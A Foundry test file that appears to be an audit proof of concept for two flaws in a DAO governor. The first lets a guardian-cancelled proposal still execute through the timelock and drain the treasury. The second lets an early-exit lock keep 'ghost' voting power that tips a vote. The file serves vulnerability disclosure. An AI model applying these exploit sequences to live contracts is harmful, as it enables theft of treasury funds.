// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Base} from "./Base.t.sol";
import {TideGovernor} from "../src/TideGovernor.sol";

/// Runs from the project's test/ folder; see run.sh.
contract Proof is Base {
    address internal attacker = makeAddr("attacker");

    /// H-1: a proposal the guardian cancels while it sits in the timelock still runs, because the governor
    /// never cancels the timelock operation and anyone can execute a ready operation.
    function test_cancelledProposalStillExecutes() public {
        _lock(alice, 500_000e18, 104 weeks);
        vm.warp(block.timestamp + 1);

        string memory description = "Hostile treasury drain";
        (address[] memory t, uint256[] memory v, bytes[] memory c, bytes32 h) =
            _grantProposal(attacker, 2_000_000e18, description);
        vm.prank(alice);
        uint256 id = governor.propose(t, v, c, description);
        vm.warp(block.timestamp + VOTING_DELAY + 1);
        vm.prank(alice);
        governor.castVote(id, 1);
        vm.warp(block.timestamp + VOTING_PERIOD);
        governor.queue(t, v, c, h);

        vm.prank(guardian);
        governor.cancel(t, v, c, h);
        assertEq(uint8(governor.state(id)), uint8(TideGovernor.ProposalState.Canceled));

        vm.warp(block.timestamp + DELAY);
        vm.prank(attacker);
        timelock.execute(t, v, c, h);
        assertEq(tide.balanceOf(attacker), 2_000_000e18);
        assertEq(tide.balanceOf(address(timelock)), 0);
    }

    /// H-2: exitEarly leaves the last checkpoint in place, so the exited account keeps its decaying voting
    /// power in every later snapshot while the same tokens are locked again elsewhere.
    function test_exitedLockKeepsVotingPower() public {
        address second = makeAddr("second");
        vm.prank(deployer);
        tide.transfer(attacker, 300_000e18);
        vm.prank(attacker);
        tide.approve(address(escrow), type(uint256).max);
        vm.prank(second);
        tide.approve(address(escrow), type(uint256).max);

        _lock(attacker, 300_000e18, 104 weeks);
        _lock(bob, 350_000e18, 104 weeks);
        vm.warp(block.timestamp + 1);

        vm.prank(attacker);
        escrow.exitEarly();
        uint256 recovered = tide.balanceOf(attacker);
        assertGt(recovered, 150_000e18);
        assertEq(escrow.getVotes(attacker), 0);
        vm.prank(attacker);
        tide.transfer(second, recovered);
        _lock(second, recovered, 104 weeks);
        vm.warp(block.timestamp + 1);

        string memory description = "Drain via ghost votes";
        (address[] memory t, uint256[] memory v, bytes[] memory c, bytes32 h) =
            _grantProposal(attacker, 2_000_000e18, description);
        vm.prank(attacker);
        uint256 id = governor.propose(t, v, c, description);
        vm.warp(block.timestamp + VOTING_DELAY + 1);

        vm.prank(attacker);
        uint256 ghost = governor.castVote(id, 1);
        vm.prank(second);
        uint256 real = governor.castVote(id, 1);
        vm.prank(bob);
        uint256 honest = governor.castVote(id, 0);
        assertGt(ghost, 290_000e18);
        assertLt(real, honest);
        assertGt(ghost + real, honest);
        assertLt(escrow.totalLocked(), 350_000e18 + 300_000e18);

        vm.warp(block.timestamp + VOTING_PERIOD);
        governor.queue(t, v, c, h);
        vm.warp(block.timestamp + DELAY);
        governor.execute(t, v, c, h);
        assertGe(tide.balanceOf(attacker), 2_000_000e18);
    }
}
